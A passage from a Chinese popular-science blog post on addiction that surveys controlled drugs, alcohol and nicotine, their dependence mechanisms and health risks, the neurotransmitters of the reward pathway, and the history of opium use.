      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>嗑药简史：药物成瘾与神经系统</title>
    <url>/2017/09/04/Addiction-Decision/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>人类生活中的瘾品：饮食、性行为、运动、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
<li>瘾品管制思路变迁：戈尔巴乔夫的禁酒运动</li>
</ul>
<a id="more"></a>
<h2 id="一、什么是瘾？"><a href="#一、什么是瘾？" class="headerlink" title="一、什么是瘾？"></a>一、什么是瘾？</h2><p>瘾被用于描述精神强迫或者过度的心理依赖。瘾有分为物质成瘾及行为成瘾。例如物质依赖，药物滥用（即毒瘾）、酒瘾、烟瘾。行为成瘾是和物质无关的强迫症，例如持续出现特定行为，例如赌博、暴饮暴食，网瘾、官瘾、财迷、工作狂、色情狂、及购物狂等。<strong>成瘾（Addiction）</strong> 是指一种重复性的强迫行为，即使这些行为已知可能造成不良后果的情形下，仍然被持续重复。这种行为可能因中枢神经系统功能失调造成，重复这些行为也可以反过来造成神经功能受损。</p>
<blockquote>
<p>Addiction is a medical condition that is characterized by compulsive engagement in rewarding stimuli, despite adverse consequences. It can be thought of as a disease or biological process leading to such behaviors. The two properties that characterize all addictive stimuli are that they are reinforcing (i.e., they increase the likelihood that a person will seek repeated exposure to them) and intrinsically rewarding (i.e., something perceived as being positive or desirable).</p>
</blockquote>
<h2 id="二、药物成瘾（drug-addiction）"><a href="#二、药物成瘾（drug-addiction）" class="headerlink" title="二、药物成瘾（drug addiction）"></a>二、药物成瘾（drug addiction）</h2><p>药物成瘾是指需要服用药物才能使日常生活表现正常的强迫行为。出现物质依赖状况后，若突然停止服用药物，可能出现药物戒断症状。许多原本用于医学用途的药品，可能造成物质依赖现象；若是被法律管制，视为非法者，则被称为毒品。根据权威医学期刊《The Lancet》(柳叶刀)发表的有关研究，常见管制药品（毒品）的依赖性（出现 <strong>依赖和戒断症状（Dependence and withdrawal）</strong> 的概率）和生理程度如下图所示，值得注意的是，酒精和烟草对人体的生理伤害与依赖性强度并不亚于未提纯的鸦片。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E7%AE%A1%E5%88%B6%E8%8D%AF%E5%93%81%E6%88%90%E7%98%BE%E6%80%A7%E6%AF%94%E8%BE%83.png" alt></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>名称</th>
<th>医药用途</th>
<th>管制级别</th>
<th>成瘾机制</th>
</tr>
</thead>
<tbody>
<tr>
<td>麻醉镇痛剂（Narcotics Analgesics）</td>
<td>鸦片</td>
<td>无</td>
<td>管制</td>
<td>欣快感、幻觉</td>
</tr>
<tr>
<td>麻醉镇痛剂（Narcotics Analgesics）</td>
<td>吗啡</td>
<td>镇痛剂</td>
<td>管制</td>
<td>强效镇痛</td>
</tr>
<tr>
<td>麻醉镇痛剂（Narcotics Analgesics）</td>
<td>美沙酮</td>
<td>戒毒治疗</td>
<td>管制</td>
<td>——-</td>
</tr>
<tr>
<td>麻醉镇痛剂（Narcotics Analgesics）</td>
<td>氯氨酮</td>
<td>短效麻醉剂（小手术），全身麻醉诱导剂</td>
<td>中国（一类）</td>
<td>美国（三类）</td>
<td>——-</td>
</tr>
<tr>
<td>麻醉镇痛剂（Narcotics Analgesics）</td>
<td>海洛因（二乙酰吗啡）</td>
<td>无</td>
<td>刑事重罪</td>
<td>——-</td>
</tr>
<tr>
<td>迷幻剂（Hallucinogens）</td>
<td>大麻及相关制品</td>
<td>无</td>
<td>——-</td>
<td>产生幻觉，娱乐道具</td>
</tr>
<tr>
<td>镇抑剂（Depressants）</td>
<td>巴比妥及相关制品</td>
<td>镇静神经、催眠、抗痉挛</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>镇抑剂（Depressants）</td>
<td>甲喹酮</td>
<td>无</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>镇抑剂（Depressants）</td>
<td>y-羟丁酸</td>
<td>无</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>兴奋剂（Stimulants）</td>
<td>安非他命（苯丙胺），俗称麻古／大力丸</td>
<td>无</td>
<td>——-</td>
<td>增强性欲和促进欣快感</td>
</tr>
<tr>
<td>兴奋剂（Stimulants）</td>
<td>亚甲二氧基（亚甲二氧甲基苯丙胺，MDMA），摇头丸</td>
<td>无</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>兴奋剂（Stimulants）</td>
<td>甲基苯丙胺，冰毒</td>
<td>无</td>
<td>——-</td>
<td>使机体产生强烈快感</td>
</tr>
<tr>
<td>兴奋剂（Stimulants）</td>
<td>卡西酮的衍生物</td>
<td>无</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>兴奋剂（Stimulants）</td>
<td>可卡因</td>
<td>麻醉</td>
<td>——-</td>
<td>提升肾上腺素／多巴胺在脑部的浓度</td>
</tr>
<tr>
<td>镇静剂（Tranquillizers）</td>
<td>安定、艾司唑仑、三唑仑等</td>
<td>催眠</td>
<td>——-</td>
<td>成瘾／胎儿不正常/认知和神经讯息传递功能受损</td>
</tr>
<tr>
<td>其他</td>
<td>可待因</td>
<td>止咳</td>
<td>——</td>
<td>——-</td>
</tr>
<tr>
<td>其他</td>
<td>同化类固醇</td>
<td>——-</td>
<td>——-</td>
<td>激素；扩增肌肉和骨头强度（心理需求）</td>
</tr>
<tr>
<td>其他</td>
<td>酒精</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>其他</td>
<td>烟草（尼古丁）</td>
<td>——-</td>
<td>——-</td>
<td>兴奋神经促进分泌更多的多巴胺，产生幸福感和放松感</td>
</tr>
</tbody>
</table>
</div>
<p><img src="http://riboseyim-qiniu.riboseyim.com/drug_20190629_woc294.png" alt></p>
<h4 id="2-1-鸦片（opium）"><a href="#2-1-鸦片（opium）" class="headerlink" title="2.1 鸦片（opium）"></a>2.1 鸦片（opium）</h4><p>天然麻醉抑制剂，医学上作麻醉性镇痛药；非科学研究或非医用，则归类于毒品。鸦片的主要成份是吗啡类生物碱，包括 <strong>吗啡</strong>（10%-14%），可待因（1%-3%，可待因进入人体后约有10%的吸收分量在体内经代谢作用转化成吗啡），蒂巴因（Thebaine，0.2%，具备痉挛毒性）。给药后分布于全身，在肾、肝、肺中浓度较高。</p>
<p>鸦片的成瘾机制：吗啡（Morphine）能直接作用于中枢神经系统，改变人体对疼痛的感觉。吸食鸦片后开始能让人产生欣快感，产生梦幻现象，进而导致高度心理及生理依赖性。长期使用后停止则会发生严重的戒断症状：渴求药物、流鼻水、易怒、发抖、寒颤、厌食等戒断症状；过量使用造成急性中毒，症状包括昏迷、呼吸抑制、低血压、瞳孔变小，严重的引起呼吸抑止致人死亡。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/135064198_14543090658061n.jpg" alt></p>
<p>芬太尼（Fentanyl）是一种强效类鸦片止痛剂，起效迅速而作用时间极短（脑中μ-鸦片受体），比吗啡效力高50至100倍。保罗·扬森最先在1960年制造出芬太尼。芬太尼在1960年代以商业名称Sublimaze进入医疗用途作为全身麻醉剂。芬太尼药物形式包括贴片、棒棒糖、溶解片剂和可以被口腔黏膜吸收掉的舌下喷剂等。截至2013年，全球共使用了1700公斤（3,750磅），是医学中使用最广泛的合成鸦片类药物。</p>
<p>芬太尼也被用作娱乐性用药，导致大量药物过量死亡案例。美国司法部于2017年10月17日起诉两名中国公民 —— 颜小冰(Xiaobing Yan音译)和张剑(Jian Zhang 音译)被指控策划通过邮件或国际邮递服务在美国销售大批量的芬太尼等鸦片类药物。美国疾病控制中心估计 2016 年有 2 万人死于芬太尼。该案成为中美两国激烈交锋的外交事件。（中国官方文件称为“新精神活性物质”，2017年初中国将芬太尼——卡芬太尼、呋喃芬太尼、丙烯酰芬太尼、戊酰芬太尼等列入非药用类麻醉药品和精神药品管制品种目录）</p>
<h4 id="2-2-海洛因（heroin）"><a href="#2-2-海洛因（heroin）" class="headerlink" title="2.2 海洛因（heroin）"></a>2.2 海洛因（heroin）</h4><p><a href="https://www.drugabuse.gov/publications/drugfacts/heroin" target="_blank" rel="noopener">海洛因（heroin 或 diacetylmorphine）</a>，学名 <strong>二乙酰吗啡</strong>；又译海洛英，有强烈的成瘾性。在医学上，海洛因可作为强效镇痛药物，用于心脏病、外伤、手术后的剧痛。</p>
<p>第一次合成海洛因是在1874年（清同治13年，日本明治7年），任职伦敦圣玛莉医院的化学家伟特（C.R Wright）（吗啡+醋酸酐，加热，得到二乙酰吗啡）。1897年，德国化学家菲力克斯·霍夫曼再次合成二乙酰吗啡（11日前，他刚成功将阿斯匹林制成药物）。1898年至1910年，海洛因作为一种止咳处方药出售，非常畅销。[海洛因（Heroin）的名字由拜尔药厂注册，拜耳公司曾尝试隐瞒其危害。]</p>
<p>海洛因的成瘾机制：初次使有感觉愉快安静，产生梦幻现象（ Heroin 一词源自德文 heroisch，意指英雄，因为海洛因会 <strong>给服用者一种英雄般的感觉</strong>）。海洛因在肝脏中会代谢成吗啡。吸食之后的12小时，身体由于得不到麻醉剂而不能正常运作，即时出现紧张、无法入睡、出汗、肠胃不适、四肢疼痛及痉挛等断瘾症状（持续三到五天）。过量使用造成急性中毒，症状包括昏睡、呼吸抑制、低血压、瞳孔变小。海洛因具高度心理及生理依赖性，上瘾的人因身体对它有适应性，会不断增加分量以得到相同的效果，滥用越久，戒断症状越长。长期使用后停药会发生渴求药物、不安、流泪、流汗、流鼻水、易怒、发抖、恶寒、打冷颤、厌食、腹泻、身体卷曲、抽筋等。</p>
<h4 id="2-3-安非他命（Amphetamine，苯丙胺）"><a href="#2-3-安非他命（Amphetamine，苯丙胺）" class="headerlink" title="2.3 安非他命（Amphetamine，苯丙胺）"></a>2.3 安非他命（Amphetamine，苯丙胺）</h4><p>安非他命（Amphetamine）是一种中枢神经兴奋剂。</p>
<p>最早于1887年被发现，在许多国家为合法的处方药，用来治疗注意力不足过动症、嗜睡症、和肥胖症，历史上也曾被用来治疗鼻塞和抑郁。安非他命适度适量地使用能提升整体抑制控制能力。在医疗用的剂量范围内，安非他命能带来情绪以及执行功能的变化，包含：减少反应时间、降低疲劳、以及肌耐力的增强。然而，若摄取剂量远超过医疗用的剂量范围，将会导致大脑执行功能受损以及横纹肌溶解症，可引发严重的药物成瘾，引起精神疾病（例如：妄想、偏执）。</p>
<p>安非他命的成瘾机制：安非他命作用于神经传导元素正肾上腺素及多巴胺，增加了单胺类神经递质在脑内的活动，服用后可以增强欣快感、提升性欲、提升清醒度、大脑执行功能发生变化。非医疗用途情况下，很多人为享乐而滥用安非他命，例如助兴时被作为增强性欲和欣快感促进剂（通常会远超过医疗用剂量范围）。滥用的副作用非常严重甚至致命。在成瘾患者停用安非他命后，出现戒断症状的概率接近九成。安非他命的戒断症状可能包含：对于各种刺激极度敏感、躁动不安（irritability）、焦虑、对于安非他命有难以抑制的渴求、烦躁、疲倦、食欲放大、过动或行动迟缓、缺乏动机、嗜睡、和清醒梦（lucid dreams）。</p>
<h4 id="2-4-甲基苯丙胺（methamphetamine）"><a href="#2-4-甲基苯丙胺（methamphetamine）" class="headerlink" title="2.4 甲基苯丙胺（methamphetamine）"></a>2.4 甲基苯丙胺（methamphetamine）</h4><p>甲基苯丙胺或甲基安非他命（methamphetamine），一种人工合成的兴奋剂。最早由日本化学家长井长义于1893年自麻黄碱成功合成，其盐酸盐或硫酸盐又称冰毒。</p>
<p>甲基苯丙胺的成瘾机制：甲基苯丙胺与苯丙胺，MDMA（摇头丸）的化学结构非常相似，可以提升多巴胺等神经递质在脑内的浓度。服用后使机体 <strong>产生强烈快感</strong>。短期内增强精神力，动力和大脑活力，大剂量服用会增加愉悦幸福感，性刺激增强，驱除睡意等。甲基苯丙胺是一种高度心理上瘾的毒品，对于大多数上瘾的人来说，再次复发是很常见的。严重副作用：精神病（思想偏执和精神分裂），临床的抑郁症（兴奋之后紧接着心理抑郁），以及肾脏及肝功能严重损伤。</p>
<h4 id="2-5-可卡因（Cocaine，古柯碱）"><a href="#2-5-可卡因（Cocaine，古柯碱）" class="headerlink" title="2.5 可卡因（Cocaine，古柯碱）"></a>2.5 可卡因（Cocaine，古柯碱）</h4><p>可卡因（Cocaine，古柯碱）是由古柯的叶子制成，是一种强烈的兴奋剂。</p>
<p>古柯的主要产地在南美。1855年，德国化学家斐德烈（G.Friedrich）首度从古柯叶中提取出麻药成分，并命名为 “Erythroxylon” 。四年后，斐德烈的同事纽曼（A.Newman）又精制出更高纯度的物质，替名为“可卡因”（Cocaine）。</p>
<p>可卡因的成瘾机制：可卡因是5-羟色胺、去甲肾上腺素，和多巴胺的再摄取抑制剂，使脑部这三种神经递质的浓度上升，服用后产生强烈的欣快感或者精神激动。可卡因作用于脑中的奖赏路径，人为了获得快乐感而上瘾。但是持续反复使用可卡因，会减少感觉快乐的能力与身体疲累。可卡因可以轻易地通过血脑屏障，而且可能会造成血脑屏障的破坏，阻碍脑部神经传递质多巴胺、并影响正肾上腺素、血清素正常摄取，加速大脑老化。除此，可卡因还会严重影响神经系统、血管的收缩、瞳孔的扩大及导致心跳不正常。</p>
<h4 id="2-6-大麻（Cannabis-sativa）"><a href="#2-6-大麻（Cannabis-sativa）" class="headerlink" title="2.6 大麻（Cannabis sativa）"></a>2.6 大麻（Cannabis sativa）</h4><p>大麻（Cannabis sativa），可作为纺织原料。主要成份：四氢大麻酚（Tetrahydrocannabinol，THC），精神活性物质，致幻。大麻二酚（CBD）具有治疗焦虑、癫痫的辅助作用。故“大麻是否是毒品”一说在全球仍具争议（吸食大麻在大部分国家仍是违法，但在荷兰、捷克、以及美国的科罗拉多州和华盛顿州，可以在法律范围内吸食大麻）。</p>
<h4 id="2-7-酒精（Ethanol，乙醇）"><a href="#2-7-酒精（Ethanol，乙醇）" class="headerlink" title="2.7 酒精（Ethanol，乙醇）"></a>2.7 酒精（Ethanol，乙醇）</h4><p>自史前时代开始人类就已开始喝酒，在中国发现的新石器时代（九千年前）陶器上面就有酒的残留物，而其中会使人欣快的主要成分就是酒精。</p>
<p>酒精能扩散穿过胃壁细胞，是一种可以在胃中被吸收的物质（非常罕见），但它主要还是在小肠中吸收，最后到达肝脏被代谢。酒精通过血液循环系统经过心脏的时候，可以降低心脏收缩力，导致心脏只会泵送更少量的血，因而降低身体的血压。酒精会使血管扩张，因此人会感到温暖（脸变得红晕和粉红色）。有研究表明，喝酒行为与抑郁症有非常紧密的关系。有人借助酒精的神经抑制作用，达到增強自信、疏解压力与不快情绪的效果，即所谓“借酒消愁”。很多社群存在的饮酒文化中，也是利用酒精作为一种社交“黏合剂”。对于大多数人而言，饮酒之后可以降低警觉性，消除拘谨不自然的感觉，对于很多具有社交恐惧的人来说，酒能令人在聚会中无拘无束流畅地说话。在某些情况下，酒精也能释放极端情绪，例如愤怒、暴力和自我伤害行为，即所谓“酒入愁肠愁更愁”。<br><img src="http://riboseyim-qiniu.riboseyim.com/Addiction%20_IMG_3440.png" alt></p>
<p>酒精的成瘾机制：酒精成瘾（Alcohol addiction）。一般在饮用四十分钟内，血液中酒精浓度达到最高值，并逐渐对大脑皮质发挥抑制作用，使人呈现失去自我控制的兴奋状态，所以酒精实质上是一种 <strong>中枢神经抑制剂</strong>。正如其它直接作用于中枢神经的药物一样（例如镇定剂），长期大量摄入酒精会影响中枢神经系统，引起耐药性。首先，醉酒之后血液中的酒精浓度降低，人会感到疲倦和沮丧，脑部的化学变化也会令人的长期情绪变得更低落。其次，饮酒产生的“正面”效应会递减，如果再次大量摄入之后无法感受到预期的效果，就必须加大剂量，“快乐”的欲念强迫饮酒者不顾一切地去寻求酒精，以满足自己的欲望。当某个人有长期摄取酒精饮料的习惯，会形成耐受性与心理依赖。一旦戒断就会带来难以忍受的痛苦，出现 <strong>酒精戒断症候群（Alcohol withdrawal syndrome）</strong> ：突然减少或中断酒精的摄取，会造成原本被抑制的神经系统过度活化，心理与生理上会因此产生各种不舒服症状。包括但不限于：肠胃不适、恶心和呕吐、全身疲倦、易累、心跳过速、流汗多、血压增高、体温上升、焦虑与烦躁不安、眼皮、嘴唇与双手发抖等戒断症状。严重时可能出现全身性痉挛、意识障碍，以及妄想、幻觉及谵妄等精神病症状。</p>
<h4 id="2-8-尼古丁（Nicotine）"><a href="#2-8-尼古丁（Nicotine）" class="headerlink" title="2.8 尼古丁（Nicotine）"></a>2.8 尼古丁（Nicotine）</h4><p>尼古丁（Nicotine，又名烟碱）是香烟内的主要有效成分，是一种强效拟副交感神经生物碱。</p>
<p>尼古丁的健康风险。尼古丁进入体内，会经由血液传送，并可通过血脑屏障，吸入后平均只需7秒即可到达脑部，肝是主要代谢尼古丁的器官。吸烟会减低男士的性表现甚至不举；损害血液循环系统，令阴茎血管闭塞，导致阳痿；减低荷尔蒙分泌使生殖器官的反应迟缓；减少精子数目（比非吸烟者平均少二十个百分比），破坏精子正常发育及活动能力（精子畸形的机会会较常人高出一倍），增加伴侣流产和胎儿畸形的机会；两成的儿童患癌病个案与父亲吸烟有关；吸烟者的子女患支气管病的机会高出一至五成；加速患上中风机会。此外，尼古丁能减少食欲，三分之一烟民戒烟后体重都会增加。</p>
<p>尼古丁的成瘾机制：香烟（Cigarette）对身体造成的生理伤害和依赖性，和酒相当，比大麻和摇头丸严重，不如可卡因、海洛因严重。尼古丁可促使脑中奖励中心的神经元分泌的更多的多巴胺，产生幸福感和放松感，进而吸食成瘾。尼古丁会刺激交感神经，借由刺激内脏神经影响副肾髓质，释放肾上腺素。尼古丁与肾上腺髓质的烟碱接受器结合后，会增加血液中肾上腺素的含量，使心脏收缩力上升、兴奋性增高。此外，大部分香烟成分之中并不单只有烟草。生产商通常在香烟内加入大量不同的添加剂，目的是控制烟丝的成分和质量，防腐，以及改变燃点时烟雾对吸食者所能产生的感觉。部分低价香烟会直接加入丁香，目的是令吸烟者的口及肺部出现少量痳痹，从而产生轻微的快感。有些制造商还推出了薄荷烟等产品，其目的则是降低吸烟及二手烟的呛辣感、借此增加吸烟率。</p>
<h4 id="2-9-药物成瘾总结"><a href="#2-9-药物成瘾总结" class="headerlink" title="2.9 药物成瘾总结"></a>2.9 药物成瘾总结</h4><p>综合上述成瘾药物的比较可以发现，成瘾刺激有二个特性，一个是其正向增强（接触后会再次进行类似行为的可能性增加），另一个是内在奖励（使用者主观上认为此物质或是行为有趣、会想要再去进行）。成瘾与伤害程度取决于药物的使用时间和剂量，同时并不是所有药物都具备高度健康风险，还需要两个条件：第一，该药物能够突破血脑屏障（blood–brain barrier (BBB),脑血管障壁)，指在血管和脑之间有一种选择性地阻止某些物质由血进入脑的“屏障”。该机制几乎不让所有的物质通过，除了氧气、二氧化碳和血糖，大部分的药和蛋白质由于分子结构过大，一般无法通过。该机制除了使脑部不会受到病菌的感染，还可以避免脑受到化学传导物质的影响。由于人体很多功能都由脑来控制，如果让化学传导物质在脑里自由流动，可能会造成反馈现象。第二，该药物能够带来快感（一段时间内），包括抑制类（止痛、麻醉）、兴奋类（抗抑郁、精力充沛）、幻觉等。如果为了获得快感，反复重演强化 “使用-快感-再次使用” 的奖赏路径（reward pathways），就很容易刺激活化大脑的奖赏机制，造成不可逆的生理变化。</p>
<ul>
<li>构建奖赏路径的神经递质</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>名称</th>
<th>分泌腺</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>儿茶酚胺catecholamine</td>
<td>多巴（L-DOPA）</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>儿茶酚胺catecholamine</td>
<td>多巴胺</td>
<td>下丘脑</td>
<td>产生愉悦感</td>
</tr>
<tr>
<td>儿茶酚胺catecholamine</td>
<td>去甲肾上腺素</td>
<td>肾上腺髓质</td>
<td>升高血压，引起激动</td>
</tr>
<tr>
<td>儿茶酚胺catecholamine</td>
<td>肾上腺素</td>
<td>肾上腺髓质</td>
<td>提高兴奋性，伴随激动和焦虑</td>
</tr>
<tr>
<td>单胺型</td>
<td>5-羟色胺</td>
<td>中枢神经元及消化道</td>
<td>幸福和快乐感觉</td>
</tr>
<tr>
<td>——-</td>
<td>催产素</td>
<td>垂体后叶</td>
<td>爱情激素</td>
</tr>
<tr>
<td>——-</td>
<td>催乳素</td>
<td>垂体前叶</td>
<td>引发平静和放松感觉</td>
</tr>
<tr>
<td>——-</td>
<td>POMC（内啡肽）</td>
<td>垂体前叶</td>
<td>效果类似吗啡</td>
</tr>
</tbody>
</table>
</div>
<p>需要特别关注的是儿茶酚胺（catecholamine）：多巴、多巴胺、去甲肾上腺素、肾上腺素等物质的总称。哺乳动物交感神经元释放去甲肾上腺素，肾上腺髓质细胞既能释放肾上腺素，也释放去甲肾上腺素。</p>
<p>儿茶酚胺合成代谢路径：酪氨酸 → L-多巴 → 多巴胺 → 去甲肾上腺素 → 肾上腺素。<br><img src="http://riboseyim-qiniu.riboseyim.com/catecholamine.png" alt></p>
<ul>
<li>多巴胺（dopamine）：尼古丁会作用于脑部，使吸食者产生愉悦感并自然成瘾，因为它是一种将多巴胺量提高的化学物质。研究发现多巴胺是参与脑内活动的关键神经传递物，参与构建奖赏路径。</li>
<li>肾上腺素（Epinephrine）：临床用于强心药。自然状态中肾上腺素释放的主要生理触发因素集中在压力，如物理威胁，兴奋，噪音，亮灯和高温环境。促进增加心率、提高呼吸频率、刺激肝糖原分解、触发脂解和肌肉收缩，兴奋性提高，但是伴随激动和焦虑，详见 <strong>战斗或逃跑反应（Fight-or-flight response）</strong>。</li>
<li>去甲肾上腺素（Norepinephrine）：临床用于升压药。生理作用与肾上腺素相反，减慢心率、全身血管广泛收缩、显著升高血压，能引起激动但不焦虑。</li>
<li>5-羟色胺（Serotonin，血清素）：抑制性神经递质，产生幸福和快乐感觉。</li>
<li>组胺：中枢神经系统中参与睡眠、荷尔蒙的分泌、体温调节，食欲与记忆形成等功能，周边系统部分可引起痒、打喷嚏、流鼻水等现象</li>
<li>催产素（Oxytocin）是一种哺乳动物激素。临床药物常用来促使子宫收缩，用在引产、加速分娩、及停止产后出血。催产素有助于减轻压力及缓解疼痛。</li>
<li>催乳素（Prolactin，简称PRL）是一种由垂体前叶分泌的蛋白质激素。主要作用为促进乳腺发育生长，刺激并维持泌乳。催乳素能引发平静和放松感觉。</li>
<li>内啡肽（endorphin），亦称安多酚或脑内啡、脑内吗啡。顾名思义，是一种可于动物体内自行生成的类吗啡生物化学合成物。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Epinephrine_path.png" alt></p>
<h2 id="三、人类生活中的瘾品"><a href="#三、人类生活中的瘾品" class="headerlink" title="三、人类生活中的瘾品"></a>三、人类生活中的瘾品</h2><h4 id="3-1-饮食"><a href="#3-1-饮食" class="headerlink" title="3.1 饮食"></a>3.1 饮食</h4><blockquote>
<p>人类对辣椒的喜好就和喜欢过山车或者喜欢洗烫水澡一样，是一种对极端刺激的特殊癖好。宾夕法尼亚大学心理学家保罗•罗岑（Paul Rozin）</p>
</blockquote>
<p>除了一部分人类之外，地球上没有任何一种哺乳动物喜欢吃辣椒。一个重要因素可能是红辣椒之类的香辛料含有辣椒素，辣椒素能刺激脑内啡分泌，辣椒越辣分泌量越高，进而导致食辣之后改变人体对疼痛的感觉，产生一种类似与吸食鸦片后的欣快感。事实上，辣椒素确实被用来作为治疗慢性痛症的药物。中国许多地区（例如：湖南、海南，台湾）均有嚼食槟榔（Areca catechu）的风俗，其萃取物已证实有抗忧郁（抗抑郁）效果。槟榔吃后会面红耳赤，如醉酒一般，苏东坡写过“两颊红潮增妩媚，谁知侬是醉槟榔”。槟榔碱虽然曾被用来治疗寄生虫，但具有高度致癌性（第一类致癌物）。虽然医学上吃槟榔会致癌已经毋庸置疑，但是显然并不足以让人们放弃这个喜好，例如台湾18岁以上居民嚼食槟榔的比例有上升趋势。</p>
<h4 id="3-2-运动"><a href="#3-2-运动" class="headerlink" title="3.2 运动"></a>3.2 运动</h4><p>据说主流中产阶级的三大生活方式是：“跑步、抄经、喝果汁”。有跑步习惯的人多少都了解过的概念：“跑者的愉悦感”（runner’s high），就是是指当运动量超过某一阶段后，肌肉内的糖原用尽，体内便会分泌脑内啡，产生止痛、欣快感。长时间、连续性的、中量至重量级的运动，诸如跑步，游泳，滑雪，划船，运动舞或球类运动等都有类似效果。所以，某些人群会从事超过身体负荷的运动量，甚至不惜运动伤害也要追去这种快感，可以理解为一种“运动上瘾”。</p>
<p>在职业健美人群中，存在一类瘾品 —— <strong>同化类固醇（蛋白同化甾类，Anabolic steroid）</strong>。与大多数毒品追求的快感刺激不同，同化类固醇是一种能够促进细胞的生长与分化的激素。同化类固醇能能促进氨基酸中蛋白质生物合成，促进肌肉变大变壮，促进骨骼的生长。睾酮是最为常见的天然来源的蛋白蛋白同化甾类，也是天然的雄性激素。健康风险：大量或长期的使用，将使身体无法自行合成，终身需依赖外源补充。另外，促进雄性化的荷尔蒙在使用的过程中往往出现干扰的雌性化反应，导致高血压，性功能减退以及睾丸萎缩，肝功能及内分泌系统严重受损。</p>
<h4 id="3-3-性"><a href="#3-3-性" class="headerlink" title="3.3 性"></a>3.3 性</h4><p>有研究显示草原田鼠在交配时会分泌催产素，而催产素则会刺激分泌多巴胺。催产素对于多种人类行为发挥重要影响。抑制与行为控制／恐惧焦虑相关的大脑区域，引发平静和放松感觉，是性高潮出现的重要因素。其它包括社会认同、夫妻或情侣间的成对结合、焦虑和产妇的行为等都与之有关，因而被称为“爱情激素”。无法分泌催产素，与无法感到同情，反社会，精神病，自恋及一般的操控个性有相关性。《科学》（Science）上的一项研究还指出，人类和狗狗的相互凝视形成了催产素分泌的正反馈，正是这一反馈让狗狗成了人类最好的朋友；而狼就没有这个机制。</p>
<h4 id="3-4-艺术"><a href="#3-4-艺术" class="headerlink" title="3.4 艺术"></a>3.4 艺术</h4><p>在人类社会中，奖赏分为两类：初级奖赏(如食物、性)和次级奖赏（美学奖赏），例如如艺术、音乐和诗歌等。聆听音乐能诱发快乐体验是大多数人听音乐的主要原因，听音乐时诱发的强烈愉悦情绪可以对神经递质产生了影响，包括血清素、内啡肽、和催乳素。血清素通常与预期结果的满足感相关，人们听到喜爱的音乐时，体内的血清素水平显著升高；音乐引起颤栗时，会使人体释放出内啡肽，产生类似于吗啡一样的止痛效果和欣快感；甚至聆听悲伤音乐时也能诱发的快乐体验，这种体验与催乳素的分泌有关（缓解痛苦、平静感）。催乳素的分泌还能通过短环路反馈进行自我调节，例如单曲循环症（喜欢重复循环播放着同一首歌）。</p>
<h4 id="3-5-宗教"><a href="#3-5-宗教" class="headerlink" title="3.5 宗教"></a>3.5 宗教</h4><p><strong>宗教致幻剂（entheogen）</strong> 这一概念是1979年由一群人类植物学家和神话学家创造出来的，用以代替“hallucinogen”（迷幻剂）和“psychedelic”（致幻剂），可以指一切被用于宗教或者精神领域的致幻剂。</p>
<p>宗教致幻剂一般是那些可以导致人类产生幻觉的自然植物／矿物质，它们在各种仪式中被使用了上千年。服用者借助心理暗示和致幻剂对神经系统产生的影响，获得 <strong>与神同在、与神交流</strong> 的心理体验。例如，科特迪瓦人会使用迷幻蘑菇。中国的道士使用大麻通神，量服丹砂导致的汞中毒或砷中毒，也会产生通神的幻觉。非洲的 Bwiti 人使用一种夹竹桃科植物 Tabernanthe iboga 的根皮作为宗教致幻剂的原料。埃及也有使用蓝睡莲和裸盖菇的记录。中医草药中曼陀罗被用以缓解哮喘症状和作为手术或接骨中的止痛剂，在印度教中，曼陀罗花（Datura stramonium，英语：Thorn apple）和大麻常被用于宗教仪式中，由于其效力过强很容易严重中毒。曼陀罗的主要成分是东莨菪碱，具有麻醉作用，它使肌肉松驰，抑制汗腺分泌，因此古人将此花所制的麻醉药取名为“蒙汗药”。</p>
<p>如果健美也算一种宗教的话，同化类固醇也可以称之为 entheogen 。</p>
<h2 id="四、乱世爱嗑药"><a href="#四、乱世爱嗑药" class="headerlink" title="四、乱世爱嗑药"></a>四、乱世爱嗑药</h2><p>18世纪以后，中国人口增加迅猛，生存压力加大，加之经常战乱，人们的安全感下降，避世厌世的情绪增加，于是很多人采取消极的态度对待，吸食鸦片就是其中的一种主要方式。</p>
<blockquote>
<p>罂粟米囊谣 (谭嗣同)<br>罂无粟， 囊无米， 室如悬磬饥欲死。<br>饥欲死， 且莫理， 米囊可疗饥，<strong>罂粟栽千里。</strong><br>非米非粟，<strong>苍生病矣！</strong></p>
</blockquote>
<p>维多利亚时代，英国人沉迷于鸦片的美妙感觉。几乎每个英国人都在他们生命的某一段时期服用过鸦片，发烧感冒，头疼脑热，呕吐腹泻，失眠多梦全靠它，服食鸦片就像喝酒或抽烟一样是生活的一部分。英国沼泽区的民众滥用鸦片的情况最严重，农业劳动的单调与繁重，沼泽地气候容易引发的疟疾、热症、风湿、神经痛和肌肉痛，鸦片“上瘾”的副作用，被当作是解脱病痛的代价。下流社会的不少酒鬼用鸦片代替酒精；上流社会的贵族、学者用鸦片享乐、激发灵感（1821年德·昆西发表了著名作品<a href="https://book.douban.com/subject/1449902/" target="_blank" rel="noopener">《一个英国吸食鸦片者的自白》</a>）；英国国王乔治三世晚年嗜食鸦片，导致严重的精神疾病，诱因可能包括白内障和风湿病的困扰、幼女阿米莉亚公主病故等，“每天都是悲痛与嚎哭的场面……令人沮丧得难以形容”。</p>
<blockquote>
